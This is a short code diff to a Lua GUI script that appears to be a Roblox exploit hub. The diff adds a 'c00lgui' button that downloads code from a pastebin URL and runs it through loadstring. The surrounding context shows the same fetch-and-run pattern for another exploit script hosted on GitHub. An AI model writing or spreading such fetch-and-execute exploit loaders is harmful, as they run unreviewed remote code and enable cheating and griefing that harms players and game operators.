@@ -133,6 +133,11 @@ local function buildGUI(theme)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/AquaMatrix/refs/heads/AquaMatrix/AquaMatrix"))()
     end)
 
+    createButton(homeTab, "c00lgui", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/tQZYjYV0"))()
+end)
+
+
     -- EXECUTOR
     local label = Instance.new("TextLabel", execTab)
     label.Size = UDim2.new(1, -20, 0, 25)
